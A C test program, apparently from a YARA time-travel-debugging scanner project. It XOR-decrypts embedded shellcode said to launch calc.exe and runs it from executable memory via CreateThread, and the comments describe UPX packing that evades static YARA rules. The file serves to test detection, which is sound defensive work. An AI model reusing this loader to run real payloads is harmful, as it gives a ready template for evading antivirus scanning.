/* Encrypted shellcode test
 *
 * This test program loads an encrypted shellcode into memory and executes it.
 * The shellcode is encrypted with a simple XOR key and executes calc.exe.
 * The original shellcode (without encryption) can be found here:
 * https://www.exploit-db.com/shellcodes/49819
 *
 * Compile with MSVC compiler and pack with upx like this:
 * upx --ultra-brute test.exe
 *
 * With yara, there are no matches:
 * yara calc-rules.yar test-shellcode.exe
 *
 * To test it with yara-ttd, record a TTD trace with WinDbg first to generate
 * the run file. With yara-ttd, set the mode 1 to scan modules and virtual
 * alloced memory and the function scan mode to scan ntdll!NtCreateThread and
 * ntdll!NtCreateThreadEx yara-ttd -M 1 calc-rules.yar test-shellcode.run
 *
 * Eventually, yara-ttd will find the calc.exe string on the heap before the
 * thread creation.
 */
#include <stdio.h>
#include <windows.h>

int main()
{
  void *exec;
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;

  unsigned int key_len = 4;
  unsigned char key[] = "cert";
  const unsigned int payload_len = 205;
  unsigned char payload[] =
      "\x2b\x55\x8f\x3f\x90\x87\x11\x3b\xe0\x34\x18\x37\xe4\x33\x64\x33\xf8\x2f"
      "\x40\x2f\xfc\x6b\x2c\xe8\x60\x34\xe3\x34\x5f\x31\xe5\xb3\xc8\x1f\x6c\x1b"
      "\x46\x83\x1c\x62\x82\x2a\xd9\x9e\xb0\xc0\x14\x9a\xba\x5c\xcb\x53\x5c\x1c"
      "\x45\x81\x16\x6d\x9a\x0b\xd4\x0a\x50\x06\x22\xe6\x7d\x06\xfc\x64\xbf\x69"
      "\x0b\x61\x39\xfc\x62\x19\xd8\x7f\xb8\x56\x04\x6a\x36\xf4\xcf\x11\x60\x65"
      "\x60\x1e\xff\x70\xa5\xc9\x52\x4c\x9b\x1b\x23\x48\x25\xec\x4a\x87\x24\x9c"
      "\x43\x09\xdb\x53\x9a\xc2\xf3\xa1\x63\x15\x4c\xfc\xdb\xf7\xee\x56\x79\x59"
      "\x87\x0f\xa7\xa5\x7b\xf3\x65\xac\xf5\x33\xb8\x2f\xb0\xce\x26\x68\x3d\xfc"
      "\xbb\x4c\xef\x4f\x61\x61\x5e\x64\x61\x60\xa0\x18\x2f\xb0\x2d\x03\xcb\x94"
      "\x81\x3f\x77\x3f\x2b\x2c\x82\x45\x1e\x97\xfe\x01\x94\x2c\x32\x84\x88\x7f"
      "\x4b\x4e\x57\x5f\x0a\x46\x4f\x55\x97\x2f\x1c\x9b\xeb\x2d\x51\xff\x58\x62"
      "\xfc\x30\x47\x8c\xf9\x40\x79";

  for (unsigned int i = 0; i < payload_len; i++)
    payload[i] = payload[i] ^ key[i % key_len] ^ i;

  exec = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!exec)
    return 1;

  RtlMoveMemory(exec, payload, payload_len);
  rv = VirtualProtect(exec, payload_len, PAGE_EXECUTE_READ, &oldprotect);
  wprintf(L"exec @ 0x%p\n", exec);
  th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec, 0, 0, 0);
  if (!th)
    return 1;

  WaitForSingleObject(th, -1);
  VirtualFree(exec, 0, MEM_RELEASE);

  return 0;
}